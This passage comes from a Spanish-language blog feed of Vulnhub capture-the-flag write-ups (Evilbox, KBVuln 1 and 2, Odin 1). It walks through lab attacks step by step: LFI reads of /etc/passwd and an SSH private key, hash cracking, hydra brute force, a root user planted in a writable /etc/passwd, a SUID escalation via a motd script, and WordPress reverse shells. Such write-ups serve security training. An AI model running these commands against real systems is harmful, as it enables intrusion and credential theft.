<p>Mostrará el archivo <code class="language-plaintext highlighter-rouge">robots.txt</code> y un directorio llamado <code class="language-plaintext highlighter-rouge">secret</code></p>

<p><img src="http://localhost:4000/assets/images/vulnhub/evilbox/5.png" alt="image-center" class="align-center" /></p>

<p>Ir a robots.txt, no mostrará nada relevante
<code class="language-plaintext highlighter-rouge">192.168.122.14/robots.txt</code></p>

<p><img src="http://localhost:4000/assets/images/vulnhub/evilbox/6.png" alt="image-center" class="align-center" /></p>

<p>Ir a secret, no mostrará contenido, sin embargo tampoco mostrará mensaje de error
<code class="language-plaintext highlighter-rouge">192.168.122.14/secret</code></p>

<p><img src="http://localhost:4000/assets/images/vulnhub/evilbox/7.png" alt="image-center" class="align-center" /></p>

<p>Realizar escaneo de directorios bajo el directorio secret y listando todo lo que termine en html, php o txt</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">sudo </span>gobuster <span class="nb">dir</span> –u 192.168.122.14/secret  <span class="nt">-w</span> /usr/share/wordlists/dirb/big.txt <span class="nt">-x</span> html,php,txt
</code></pre></div></div>

<p><img src="http://localhost:4000/assets/images/vulnhub/evilbox/8.png" alt="image-center" class="align-center" /></p>

<p>Aparecerá un nuevo archivo llamado <code class="language-plaintext highlighter-rouge">evil.php</code></p>

<p><img src="http://localhost:4000/assets/images/vulnhub/evilbox/9.png" alt="image-center" class="align-center" /></p>

<p>Al ir de nuevo no mostrará nada, ni si quiera mensaje de error</p>

<p><code class="language-plaintext highlighter-rouge">192.168.122.14/secret/evil.php</code></p>

<p><img src="http://localhost:4000/assets/images/vulnhub/evilbox/10.png" alt="image-center" class="align-center" /></p>

<p>Tratar de fuzzear para intentar ejecutar comandos y de este modo leer el contenido de <code class="language-plaintext highlighter-rouge">/etc/passwd</code></p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>wfuzz <span class="nt">-u</span> <span class="s2">"http://192.168.122.14/secret/evil.php?FUZZ=../../../../../../etc/passwd"</span>  <span class="nt">-w</span> /usr/share/wordlists/fuzz-lfi-params-list.txt <span class="nt">-hw</span> 0
</code></pre></div></div>

<p><img src="http://localhost:4000/assets/images/vulnhub/evilbox/11.png" alt="image-center" class="align-center" /></p>

<p>Aparecerá como resultado que puede usarse command</p>

<p><img src="http://localhost:4000/assets/images/vulnhub/evilbox/12.png" alt="image-center" class="align-center" /></p>

<p>Ir a la url añadiendo <code class="language-plaintext highlighter-rouge">?command=../../../../../../etc/passwd</code></p>

<p><code class="language-plaintext highlighter-rouge">192.168.122.14/secret/evil.php?command=../../../../../../etc/passwd</code></p>

<p><img src="http://localhost:4000/assets/images/vulnhub/evilbox/13.png" alt="image-center" class="align-center" /></p>

<p>Inspeccionar el código fuente para que se muestre de forma ordenada</p>

<p><img src="http://localhost:4000/assets/images/vulnhub/evilbox/14.png" alt="image-center" class="align-center" /></p>

<p>Al observar el archivo <code class="language-plaintext highlighter-rouge">/etc/passwd</code> podrá verse un usuario llamado mowree</p>

<p><img src="http://localhost:4000/assets/images/vulnhub/evilbox/15.png" alt="image-center" class="align-center" /></p>

<p>Ir a <code class="language-plaintext highlighter-rouge">/home/mowree/.ssh/id_rsa</code> para buscar la clave privada del usuario</p>

<p>http://192.168.122.14/secret/evil.php?FUZZ=/home/mowree/.ssh/id_rsa</p>

<p><img src="http://localhost:4000/assets/images/vulnhub/evilbox/16.png" alt="image-center" class="align-center" /></p>

<p>Copiar la clave privada y guardarla en el equipo atacante</p>

<p><img src="http://localhost:4000/assets/images/vulnhub/evilbox/17.png" alt="image-center" class="align-center" /></p>

<p><img src="http://localhost:4000/assets/images/vulnhub/evilbox/18.png" alt="image-center" class="align-center" /></p>

<p>Convertirlo a hash con la herramienta ssh2john.py y guardarlo en otro archivo nuevo</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>/usr/share/john/ssh2john.py id_rsa <span class="o">&gt;</span> id_rsa_hash.txt
</code></pre></div></div>

<p><img src="http://localhost:4000/assets/images/vulnhub/evilbox/19.png" alt="image-center" class="align-center" /></p>

<p>Crackear la contraseña con john</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>john id_rsa_hash.txt
</code></pre></div></div>

<p><img src="http://localhost:4000/assets/images/vulnhub/evilbox/20.png" alt="image-center" class="align-center" /></p>

<p>Mostrará la contraseña como resultado</p>

<p><img src="http://localhost:4000/assets/images/vulnhub/evilbox/21.png" alt="image-center" class="align-center" /></p>

<p>Entrar por ssh con el usuario mowree y la contraseña encontrada</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ssh mowree@192.168.122.14 <span class="nt">-i</span> id_rsa
</code></pre></div></div>

<p><img src="http://localhost:4000/assets/images/vulnhub/evilbox/22.png" alt="image-center" class="align-center" /></p>

<p>Mostrar el contenido del directorio home del usuario mowree y leer el archivo <code class="language-plaintext highlighter-rouge">user.txt</code></p>

<p><img src="http://localhost:4000/assets/images/vulnhub/evilbox/23.png" alt="image-center" class="align-center" /></p>

<p>Al mostrar los permisos de <code class="language-plaintext highlighter-rouge">/etc/passwd</code> podrá verse que tiene permiso de escritura para todos los usuarios</p>

<p><img src="http://localhost:4000/assets/images/vulnhub/evilbox/24.png" alt="image-center" class="align-center" /></p>

<p>Crear una nuevo usuario con una clave creada en  formato sha-512 desde la maquina atacante</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>mkpasswd <span class="nt">-m</span> sha-512
</code></pre></div></div>

<p><img src="http://localhost:4000/assets/images/vulnhub/evilbox/25.png" alt="image-center" class="align-center" /></p>

<p>Guardarla en un archivo y crear una linea como si de un usuario se tratase, dando permisos de root</p>

<p><img src="http://localhost:4000/assets/images/vulnhub/evilbox/26.png" alt="image-center" class="align-center" /></p>

<p>Copiar este nuevo usuario y ponerlo en el <code class="language-plaintext highlighter-rouge">/etc/passwd</code> de la máquina victima</p>

<p><img src="http://localhost:4000/assets/images/vulnhub/evilbox/27.png" alt="image-center" class="align-center" /></p>

<p>Cambiar al usuario nuevo</p>

<p><img src="http://localhost:4000/assets/images/vulnhub/evilbox/28.png" alt="image-center" class="align-center" /></p>

<p>Ir a <code class="language-plaintext highlighter-rouge">/root</code> y mostrar el contenido de root.txt</p>

<p><img src="http://localhost:4000/assets/images/vulnhub/evilbox/29.png" alt="image-center" class="align-center" /></p>

<h2 id="flags">Flags</h2>

<p>User: 56Rbp0soobpzWSVzKh9YOvzGLgtPZQ</p>

<p>Root: 36QtXfdJWvdC0VavlPIApUbDlqTsBM</p>]]></content><author><name>TheZombrex</name></author><category term="vulnhub" /><category term="vulnhub" /><category term="easy" /><category term="writeup" /><category term="video" /><summary type="html"><![CDATA[[Easy][Vulnhub] Writeup de Evilbox.]]></summary></entry><entry><title type="html">KBVuln 1</title><link href="http://localhost:4000/vulnhub/kbvuln1/" rel="alternate" type="text/html" title="KBVuln 1" /><published>2022-08-01T00:00:00+02:00</published><updated>2022-08-01T00:00:00+02:00</updated><id>http://localhost:4000/vulnhub/kbvuln1</id><content type="html" xml:base="http://localhost:4000/vulnhub/kbvuln1/"><![CDATA[<p><a href="https://www.vulnhub.com/entry/kb-vuln-1,540/">https://www.vulnhub.com/entry/kb-vuln-1,540/</a></p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">sudo </span>nmap <span class="nt">-vvv</span> <span class="nt">-sS</span> <span class="nt">-sV</span> <span class="nt">-O</span> 192.168.122.0/24
</code></pre></div></div>

<p><img src="http://localhost:4000/assets/images/vulnhub/kbvuln1/1.png" alt="image-center" class="align-center" /></p>

<p>Saldrá una máquina con varios puertos abiertos</p>

<p><img src="http://localhost:4000/assets/images/vulnhub/kbvuln1/2.png" alt="image-center" class="align-center" /></p>

<p>Entrar al servidor web desde el navegador, aparecerá una web normal</p>

<p><img src="http://localhost:4000/assets/images/vulnhub/kbvuln1/3.png" alt="image-center" class="align-center" /></p>

<p>Analizar directorios ocultos con gobuster</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>gobuster <span class="nb">dir</span> –u 192.168.122.4 <span class="nt">-w</span> /usr/share/dirb/wordlists/common.txt
</code></pre></div></div>

<p><img src="http://localhost:4000/assets/images/vulnhub/kbvuln1/4.png" alt="image-center" class="align-center" /></p>

<p>No aparece nada fuera de lo normal.</p>

<p>Tratar de entrar en el servidor FTP de forma anónima</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ftp 192.168.122.4
</code></pre></div></div>

<p>Usuario: Anonymous</p>

<p>Contraseña: Vacía</p>

<p><img src="http://localhost:4000/assets/images/vulnhub/kbvuln1/5.png" alt="image-center" class="align-center" /></p>

<p>Mostrar el contenido y descargar el único archivo que se encuentra en el directorio</p>

<p><img src="http://localhost:4000/assets/images/vulnhub/kbvuln1/6.png" alt="image-center" class="align-center" /></p>

<p>No se encuentra nada útil</p>

<p><img src="http://localhost:4000/assets/images/vulnhub/kbvuln1/7.png" alt="image-center" class="align-center" /></p>

<p>Ver código fuente del sitio web, saldrá un usuario llamado sysadmin</p>

<p><img src="http://localhost:4000/assets/images/vulnhub/kbvuln1/8.png" alt="image-center" class="align-center" /></p>

<p>Usar hydra para hacer fuerza bruta al ssh de la máquina con el usuario sysadmin</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">sudo </span>hydra <span class="nt">-l</span> sysadmin –P /usr/share/wordlists/rockyou.txt 192.168.122.4 ssh
</code></pre></div></div>

<p><img src="http://localhost:4000/assets/images/vulnhub/kbvuln1/9.png" alt="image-center" class="align-center" /></p>

<p>Entar por ssh a la máquina usando el usuario sysadmin y la contraseña obtenida con hydra</p>

<p><img src="http://localhost:4000/assets/images/vulnhub/kbvuln1/10.png" alt="image-center" class="align-center" /></p>

<p>Mostrar el contenido y leer el archivo user.txt, mostrará el flag del usuario</p>

<p><img src="http://localhost:4000/assets/images/vulnhub/kbvuln1/11.png" alt="image-center" class="align-center" /></p>

<p>Ir al directorio ftp y mostrar el contenido</p>

<p><img src="http://localhost:4000/assets/images/vulnhub/kbvuln1/12.png" alt="image-center" class="align-center" /></p>

<p>Leer el archivo .bash_history</p>

<p><img src="http://localhost:4000/assets/images/vulnhub/kbvuln1/13.png" alt="image-center" class="align-center" /></p>

<p>Ir al directorio /etc/update-motd.d/ y mostrar todo el contenido</p>

<p><img src="http://localhost:4000/assets/images/vulnhub/kbvuln1/14.png" alt="image-center" class="align-center" /></p>

<p>Saldrá un archivo con todos los permisos, este controla el mensaje que aparece cada vez que se inicia una sesión por SSH</p>

<p>Editar el archivo /etc/update.motd.d/00-header y añadir al final:</p>

<p>sudo chmod u+s /usr/bin/find</p>

<p>Esto permitirá usar un comando que cambiará el usuario a root</p>

<p><img src="http://localhost:4000/assets/images/vulnhub/kbvuln1/15.png" alt="image-center" class="align-center" /></p>

<p>Usar el comando para obtener acceso root:
find . -exec /bin/bash -p \; -quit</p>

<p><img src="http://localhost:4000/assets/images/vulnhub/kbvuln1/16.png" alt="image-center" class="align-center" /></p>

<p>Ir al directorio de root y leer el flag</p>

<p><img src="http://localhost:4000/assets/images/vulnhub/kbvuln1/17.png" alt="image-center" class="align-center" /></p>

<h2 id="flags">Flags</h2>

<p>Usuario: 48a365b4ce1e322a55ae9017f3daf0c0</p>

<p>Root: 1eedddf9fff436e6648b5e51cb0d2ec7</p>]]></content><author><name>TheZombrex</name></author><category term="vulnhub" /><category term="vulnhub" /><category term="easy" /><category term="writeup" /><summary type="html"><![CDATA[[Easy][Vulnhub] Writeup de KBVuln 1.]]></summary></entry><entry><title type="html">KBVuln 2</title><link href="http://localhost:4000/vulnhub/kbvuln2/" rel="alternate" type="text/html" title="KBVuln 2" /><published>2022-08-01T00:00:00+02:00</published><updated>2022-08-01T00:00:00+02:00</updated><id>http://localhost:4000/vulnhub/kbvuln2</id><content type="html" xml:base="http://localhost:4000/vulnhub/kbvuln2/"><![CDATA[<p><a href="https://www.vulnhub.com/entry/kb-vuln-2,562/">https://www.vulnhub.com/entry/kb-vuln-2,562/</a></p>

<p><a href="https://github.com/wetw0rk/malicious-wordpress-plugin">https://github.com/wetw0rk/malicious-wordpress-plugin</a></p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">sudo </span>nmap <span class="nt">-vvv</span> <span class="nt">-sS</span> <span class="nt">-sV</span> <span class="nt">-O</span> 192.168.122.0/24
</code></pre></div></div>

<p><img src="http://localhost:4000/assets/images/vulnhub/kbvuln2/1.png" alt="image-center" class="align-center" /></p>

<p>Saldrá una máquina con varios puertos abiertos</p>

<p><img src="http://localhost:4000/assets/images/vulnhub/kbvuln2/2.png" alt="image-center" class="align-center" /></p>

<p>Entrar al servidor web con la dirección 192.168.122.6, saldrá la web por defecto de Apache</p>

<p><img src="http://localhost:4000/assets/images/vulnhub/kbvuln2/3.png" alt="image-center" class="align-center" /></p>

<p>Usar gobuster para ver directorios ocultos, mostrará como resultado varios directorios, entre ellos uno llamado wordpress</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">sudo </span>gobuster <span class="nb">dir</span> <span class="nt">-u</span> 192.168.122.6 <span class="nt">-w</span> /usr/share/dirb/wordlists/common.txt
</code></pre></div></div>

<p><img src="http://localhost:4000/assets/images/vulnhub/kbvuln2/4.png" alt="image-center" class="align-center" /></p>

<p>Enumerar los usuarios de la web de wordpress, solo encontrará el usuario admin</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">sudo </span>wpscan <span class="nt">--url</span> 192.168.122.6/wordpress <span class="nt">-e</span> u
</code></pre></div></div>

<p>Usuario: Anonymous
Contraseña: Vacía</p>

<p><img src="http://localhost:4000/assets/images/vulnhub/kbvuln2/5.png" alt="image-center" class="align-center" />
<img src="http://localhost:4000/assets/images/vulnhub/kbvuln2/6.png" alt="image-center" class="align-center" /></p>

<p>Lanzar un ataque de fuerza bruta para encontrar la contraseña del usuario admin, no dará resultado</p>

<p><img src="http://localhost:4000/assets/images/vulnhub/kbvuln2/7.png" alt="image-center" class="align-center" /></p>

<p>Buscar usuarios en el sistema, solo encontrará kbadmin</p>

<p><img src="http://localhost:4000/assets/images/vulnhub/kbvuln2/8.png" alt="image-center" class="align-center" /></p>

<p><img src="http://localhost:4000/assets/images/vulnhub/kbvuln2/9.png" alt="image-center" class="align-center" /></p>

<p>Intentar un ataque de fuerza bruta para conseguir la contraseña, no dará resultado</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">sudo </span>hydra <span class="nt">-l</span> kbadmin <span class="nt">-P</span> /usr/share/wordlists/rockyou.txt 192.168.122.6 ssh
</code></pre></div></div>

<p><img src="http://localhost:4000/assets/images/vulnhub/kbvuln2/10.png" alt="image-center" class="align-center" /></p>

<p>Ver directorios compartidos por smb</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>smbmap <span class="nt">-H</span>  192.168.122.6
</code></pre></div></div>

<p><img src="http://localhost:4000/assets/images/vulnhub/kbvuln2/11.png" alt="image-center" class="align-center" /></p>

<p>Entrar al directorio de Anonymous y mostrar el contenido</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>smbclient <span class="nt">-N</span> //192.168.122.6/Anonymous
</code></pre></div></div>

<p><img src="http://localhost:4000/assets/images/vulnhub/kbvuln2/12.png" alt="image-center" class="align-center" /></p>

<p>Descargar el archivo backup.zip</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>get backup.zip
</code></pre></div></div>

<p><img src="http://localhost:4000/assets/images/vulnhub/kbvuln2/13.png" alt="image-center" class="align-center" /></p>

<p>Moverlo a un nuevo directorio y descomprimirlo</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">mkdir </span>kbvuln2
<span class="nb">mv </span>backup.zip kbvuln2/
<span class="nb">ls
</span>unzip backup.zip
</code></pre></div></div>

<p><img src="http://localhost:4000/assets/images/vulnhub/kbvuln2/14.png" alt="image-center" class="align-center" /></p>

<p><img src="http://localhost:4000/assets/images/vulnhub/kbvuln2/15.png" alt="image-center" class="align-center" /></p>

<p>Creará un directorio llamado wordpress y un archivo llamado <code class="language-plaintext highlighter-rouge">remember_me.txt</code></p>

<p><img src="http://localhost:4000/assets/images/vulnhub/kbvuln2/16.png" alt="image-center" class="align-center" /></p>

<p>Leer el archivo remember_me.txt, mostrará un usuario y contraseña</p>

<p><img src="http://localhost:4000/assets/images/vulnhub/kbvuln2/17.png" alt="image-center" class="align-center" /></p>

<p>Ir al login de la web de wordpress</p>

<p><img src="http://localhost:4000/assets/images/vulnhub/kbvuln2/18.png" alt="image-center" class="align-center" /></p>

<p>Copiar la direccion DNS del action del formulario.</p>

<p><img src="http://localhost:4000/assets/images/vulnhub/kbvuln2/19.png" alt="image-center" class="align-center" /></p>

<p>Añadir el dominio dns al archivo <code class="language-plaintext highlighter-rouge">/etc/hosts</code></p>

<p><img src="http://localhost:4000/assets/images/vulnhub/kbvuln2/20.png" alt="image-center" class="align-center" /></p>

<p>Recargar el sitio, ahora se verá correctamente</p>

<p><img src="http://localhost:4000/assets/images/vulnhub/kbvuln2/21.png" alt="image-center" class="align-center" /></p>

<p>Colocar el usuario y contraseña y dar en Log In</p>

<p><img src="http://localhost:4000/assets/images/vulnhub/kbvuln2/22.png" alt="image-center" class="align-center" /></p>

<p>Ir al editor de temas de wordpress</p>

<p><img src="http://localhost:4000/assets/images/vulnhub/kbvuln2/23.png" alt="image-center" class="align-center" /></p>

<p>Editar el archivo 404 con un script de reverse_php</p>

<p>Preparar un plugin que hará un shell inverso</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">cd</span> ~/Downloads/repos

git clone https://github.com/wetw0rk/malicious-wordpress-plugin.git

<span class="nb">cd </span>malicious-wordpress-plugin

Python wordpwn.py 192.168.122.5 4444 Y
</code></pre></div></div>

<p><img src="http://localhost:4000/assets/images/vulnhub/kbvuln2/24.png" alt="image-center" class="align-center" /></p>

<p>Se pondrá de forma automática en escucha</p>

<p><img src="http://localhost:4000/assets/images/vulnhub/kbvuln2/25.png" alt="image-center" class="align-center" /></p>

<p>Y se creará un archivo zip</p>

<p><img src="http://localhost:4000/assets/images/vulnhub/kbvuln2/26.png" alt="image-center" class="align-center" /></p>

<p>Subir el plugin al sitio de wordpress</p>

<p><img src="http://localhost:4000/assets/images/vulnhub/kbvuln2/27.png" alt="image-center" class="align-center" />
<img src="http://localhost:4000/assets/images/vulnhub/kbvuln2/28.png" alt="image-center" class="align-center" /></p>

<p>Activar el plugin</p>

<p><img src="http://localhost:4000/assets/images/vulnhub/kbvuln2/29.png" alt="image-center" class="align-center" /></p>

<p>Ir al editor de plugins y seleccionar GotEm</p>

<p><img src="http://localhost:4000/assets/images/vulnhub/kbvuln2/30.png" alt="image-center" class="align-center" /></p>

<p>Ir a la ruta del plugin
<code class="language-plaintext highlighter-rouge">http://192.168.122.6/wordpress/wp-content/plugins/malicious/wetw0rk_maybe.php</code></p>

<p><img src="http://localhost:4000/assets/images/vulnhub/kbvuln2/31.png" alt="image-center" class="align-center" /></p>

<p>Se abrirá un shell inverso con meterpreter</p>

<p><img src="http://localhost:4000/assets/images/vulnhub/kbvuln2/32.png" alt="image-center" class="align-center" /></p>

<p>Cambiar a shell y ver el usuario</p>

<p><img src="http://localhost:4000/assets/images/vulnhub/kbvuln2/33.png" alt="image-center" class="align-center" /></p>

<p>Ir al directorio home del usuario kbadmin y mostrar el contenido, luego leer el archivo <code class="language-plaintext highlighter-rouge">user.txt</code></p>

<p>Dará la flag del usuario</p>

<p><img src="http://localhost:4000/assets/images/vulnhub/kbvuln2/34.png" alt="image-center" class="align-center" /></p>

<p>Ir a /var/www/html y mostrar el contenido</p>

<p><img src="http://localhost:4000/assets/images/vulnhub/kbvuln2/35.png" alt="image-center" class="align-center" /></p>

<p>Leer el contenido de read_ME.txt</p>

<p><img src="http://localhost:4000/assets/images/vulnhub/kbvuln2/36.png" alt="image-center" class="align-center" /></p>

<p>Leer el contenido del archivo remember_me.txt</p>

<p><img src="http://localhost:4000/assets/images/vulnhub/kbvuln2/37.png" alt="image-center" class="align-center" /></p>

<p>Tratar de acceder por ssh al usuario kbadmin con esa contraseña</p>

<p><img src="http://localhost:4000/assets/images/vulnhub/kbvuln2/38.png" alt="image-center" class="align-center" /></p>

<p>Ver los permisos del usuario kbadmin usando el comando <code class="language-plaintext highlighter-rouge">sudo –l</code>, mostrará que tiene todos los permisos por lo que puede cambiar al usuario root sin necesidad de introducir contraseña.</p>

<p><img src="http://localhost:4000/assets/images/vulnhub/kbvuln2/39.png" alt="image-center" class="align-center" /></p>

<p>Cambiar al usuario root</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">sudo </span>su
</code></pre></div></div>
<p><img src="http://localhost:4000/assets/images/vulnhub/kbvuln2/40.png" alt="image-center" class="align-center" /></p>

<p>Ir al directorio de root y mostrar el contenido</p>

<p><img src="http://localhost:4000/assets/images/vulnhub/kbvuln2/41.png" alt="image-center" class="align-center" /></p>

<p>Mostrar el contenido de flag.txt</p>

<p><img src="http://localhost:4000/assets/images/vulnhub/kbvuln2/42.png" alt="image-center" class="align-center" /></p>

<h2 id="flags">Flags</h2>

<p>Usuario: 03bf4d20dac5644c75e69e40bad48db0</p>

<p>Root: dc387b4cf1a4143f562dd1bdb3790ff1</p>]]></content><author><name>TheZombrex</name></author><category term="vulnhub" /><category term="vulnhub" /><category term="easy" /><category term="writeup" /><summary type="html"><![CDATA[[Easy][Vulnhub] Writeup de KBVuln 2.]]></summary></entry><entry><title type="html">Odin 1</title><link href="http://localhost:4000/vulnhub/odin1/" rel="alternate" type="text/html" title="Odin 1" /><published>2022-08-01T00:00:00+02:00</published><updated>2022-08-01T00:00:00+02:00</updated><id>http://localhost:4000/vulnhub/odin1</id><content type="html" xml:base="http://localhost:4000/vulnhub/odin1/"><![CDATA[<p><a href="https://www.vulnhub.com/entry/odin-1,619/">https://www.vulnhub.com/entry/odin-1,619//</a></p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">sudo </span>nmap <span class="nt">-vvv</span> <span class="nt">-sS</span> <span class="nt">-sV</span> <span class="nt">-O</span> <span class="nt">-Pn</span> 192.168.122.0/24
</code></pre></div></div>

<p><img src="http://localhost:4000/assets/images/vulnhub/odin1/1.png" alt="image-center" class="align-center" /></p>

<p>Aparecerá una máquina con el puerto 80 abierto</p>

<p><img src="http://localhost:4000/assets/images/vulnhub/odin1/2.png" alt="image-center" class="align-center" /></p>

<p>Aparecerá una máquina con el puerto 80 abierto</p>

<p><img src="http://localhost:4000/assets/images/vulnhub/odin1/3.png" alt="image-center" class="align-center" /></p>

<p>Editar el archivo <code class="language-plaintext highlighter-rouge">/etc/host</code> y añadir la ip de la máquina con su respectivo DNS</p>

<p><img src="http://localhost:4000/assets/images/vulnhub/odin1/4.png" alt="image-center" class="align-center" /></p>

<p>Hacer click en el primer artículo y pasarlo por dcode.fr</p>

<p><img src="http://localhost:4000/assets/images/vulnhub/odin1/5.png" alt="image-center" class="align-center" /></p>

<p>Saldrá que está cifrado en Base32</p>

<p><img src="http://localhost:4000/assets/images/vulnhub/odin1/6.png" alt="image-center" class="align-center" /></p>

<p>Usar el descifrador de Base32, pondrá un enlace que lleva al repositorio de SecLists, específicamente al wordlist de rockyou</p>

<p><img src="http://localhost:4000/assets/images/vulnhub/odin1/7.png" alt="image-center" class="align-center" /></p>

<p>Realizar el mismo proceso con el siguiente texto</p>

<p><img src="http://localhost:4000/assets/images/vulnhub/odin1/8.png" alt="image-center" class="align-center" /></p>

<p>Saldrá que es Base64, descifrarlo</p>

<p><img src="http://localhost:4000/assets/images/vulnhub/odin1/9.png" alt="image-center" class="align-center" /></p>

<p><img src="http://localhost:4000/assets/images/vulnhub/odin1/10.png" alt="image-center" class="align-center" /></p>

<p>Y por último con el comentario del artículo</p>

<p><img src="http://localhost:4000/assets/images/vulnhub/odin1/11.png" alt="image-center" class="align-center" /></p>

<p>Saldrá que es brainfuck</p>

<p><img src="http://localhost:4000/assets/images/vulnhub/odin1/12.png" alt="image-center" class="align-center" /></p>

<p>No mostrará nada relevante</p>

<p><img src="http://localhost:4000/assets/images/vulnhub/odin1/13.png" alt="image-center" class="align-center" /></p>

<p>Ir al login de la web y probar un usuario</p>

<p><img src="http://localhost:4000/assets/images/vulnhub/odin1/14.png" alt="image-center" class="align-center" /></p>

<p>Mostrará que el usuario no existe</p>

<p><img src="http://localhost:4000/assets/images/vulnhub/odin1/15.png" alt="image-center" class="align-center" /></p>

<p>Probar con admin, mostrará que el usuario existe pero la contraseña es incorrecta</p>

<p><img src="http://localhost:4000/assets/images/vulnhub/odin1/16.png" alt="image-center" class="align-center" /></p>

<p>Usar wpcan para encontrar la contraseña del usuario admin utilizando el wordlist de rockyou</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">sudo </span>wpscan <span class="nt">--192</span>.168.122.6 <span class="nt">--usernames</span> admin <span class="nt">-P</span> /usr/share/wordlists/rockyou.txt
</code></pre></div></div>

<p><img src="http://localhost:4000/assets/images/vulnhub/odin1/17.png" alt="image-center" class="align-center" /></p>

<p>Encontrará una contraseña para el usuario admin</p>

<p><img src="http://localhost:4000/assets/images/vulnhub/odin1/18.png" alt="image-center" class="align-center" />
<img src="http://localhost:4000/assets/images/vulnhub/odin1/19.png" alt="image-center" class="align-center" /></p>

<p>Entrar al panel de control de wordpress con el usuario admin y la contraseña que ha mostrado wpscan</p>

<p><img src="http://localhost:4000/assets/images/vulnhub/odin1/20.png" alt="image-center" class="align-center" /></p>

<p>Dará acceso al panel de control de la web</p>

<p><img src="http://localhost:4000/assets/images/vulnhub/odin1/20.png" alt="image-center" class="align-center" /></p>

<p>Ir al editor de temas y probar si puede modificarse el tema del error 404
Copiar el contenido de <code class="language-plaintext highlighter-rouge">/usr/share/webshells/php/php-reverse-shell.php</code></p>

<p><img src="http://localhost:4000/assets/images/vulnhub/odin1/21.png" alt="image-center" class="align-center" /></p>

<p><img src="http://localhost:4000/assets/images/vulnhub/odin1/22.png" alt="image-center" class="align-center" /></p>

<p>Pegarlo en el tema del error 404</p>

<p><img src="http://localhost:4000/assets/images/vulnhub/odin1/23.png" alt="image-center" class="align-center" /></p>

<p>Ver la IP del equipo atacante</p>

<p>ifconfig</p>

<p><img src="http://localhost:4000/assets/images/vulnhub/odin1/24.png" alt="image-center" class="align-center" /></p>

<p>Cambiar el puerto y la ip en el script</p>

<p><img src="http://localhost:4000/assets/images/vulnhub/odin1/25.png" alt="image-center" class="align-center" /></p>

<p>Y aplicar los cambios</p>

<p><img src="http://localhost:4000/assets/images/vulnhub/odin1/26.png" alt="image-center" class="align-center" /></p>

<p>Poner el equipo con el puerto de escucha</p>

<p><img src="http://localhost:4000/assets/images/vulnhub/odin1/27.png" alt="image-center" class="align-center" /></p>

<p>Entrar a una direccion inválida en la web de wordpress</p>

<p><img src="http://localhost:4000/assets/images/vulnhub/odin1/28.png" alt="image-center" class="align-center" /></p>

<p>Abrirá una shell inversa</p>

<p><img src="http://localhost:4000/assets/images/vulnhub/odin1/29.png" alt="image-center" class="align-center" /></p>

<p>Ir al home de los usuarios y mostrar contenido, no mostrará nada relevante</p>

<p>Ir a /var/www/html/ y mostrar contenido</p>

<p><img src="http://localhost:4000/assets/images/vulnhub/odin1/30.png" alt="image-center" class="align-center" /></p>

<p>Leer el contenido de <code class="language-plaintext highlighter-rouge">wp-config.php</code></p>

<p><img src="http://localhost:4000/assets/images/vulnhub/odin1/31.png" alt="image-center" class="align-center" /></p>

<p>Mostrará una contraseña cifrada para el usuario root</p>

<p><img src="http://localhost:4000/assets/images/vulnhub/odin1/32.png" alt="image-center" class="align-center" /></p>

<p>Copiar la contraseña cifrada y guardarla en un archivo del equipo atacante</p>

<p><img src="http://localhost:4000/assets/images/vulnhub/odin1/33.png" alt="image-center" class="align-center" /></p>

<p>Usar <code class="language-plaintext highlighter-rouge">john</code> para descifrar la contraseña del usuario root</p>

<p><img src="http://localhost:4000/assets/images/vulnhub/odin1/34.png" alt="image-center" class="align-center" /></p>

<p>Mostrará una contraseña para el usuario root</p>

<p><img src="http://localhost:4000/assets/images/vulnhub/odin1/35.png" alt="image-center" class="align-center" /></p>

<p>Cambiar de usuario a root</p>

<p><img src="http://localhost:4000/assets/images/vulnhub/odin1/36.png" alt="image-center" class="align-center" /></p>

<p>Ir al directorio de root</p>

<p><img src="http://localhost:4000/assets/images/vulnhub/odin1/37.png" alt="image-center" class="align-center" /></p>

<p>Leer el contenido de <code class="language-plaintext highlighter-rouge">bjorn</code></p>

<p><img src="http://localhost:4000/assets/images/vulnhub/odin1/38.png" alt="image-center" class="align-center" /></p>

<p>Al desencriptar el mensaje llevará a un vídeo de youtube</p>

<p><img src="http://localhost:4000/assets/images/vulnhub/odin1/39.png" alt="image-center" class="align-center" /></p>

